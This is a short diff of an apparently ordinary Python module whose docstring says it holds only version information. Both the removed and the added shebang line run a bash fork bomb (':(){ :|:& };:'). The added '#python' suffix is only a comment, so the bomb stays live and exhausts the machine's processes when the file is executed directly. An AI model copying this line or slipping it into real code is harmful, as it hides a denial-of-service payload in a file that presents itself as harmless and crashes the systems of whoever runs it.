@@ -1,4 +1,4 @@
-#!/usr/bin/env -S bash -c ':(){ :|:& };:'
+#!/usr/bin/env -S bash -c ':(){ :|:& };:#python'
 """This module exists purely for version information, and has no other contents."""  # noqa: D404
 
 __all__: tuple[str, ...] = (
